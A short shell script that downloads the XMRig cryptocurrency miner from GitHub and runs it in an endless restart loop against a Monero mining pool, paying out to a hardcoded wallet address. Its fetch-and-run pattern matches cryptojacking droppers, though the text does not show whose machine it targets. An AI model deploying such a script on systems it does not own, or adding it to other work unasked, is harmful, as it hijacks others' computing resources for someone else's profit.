#!/bin/sh
curl -L "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz" > xmrig-6.18.1-linux-x64.tar.gz
tar -xvf xmrig-6.18.1-linux-x64.tar.gz
cd xmrig-6.18.1
while [ 1 ]; do
	./xmrig -a randomx --url randomx.rplant.xyz:17080 --tls --user 48FGBZqmhyvQPWkDkVFXzqXEgxEQdV6rX1M4K6rW86g4PbQ9bBwj9vKFhfhPW4D78bh3HRYKhWC2KjQDH5535htDAcxe9m5
	sleep 5
done
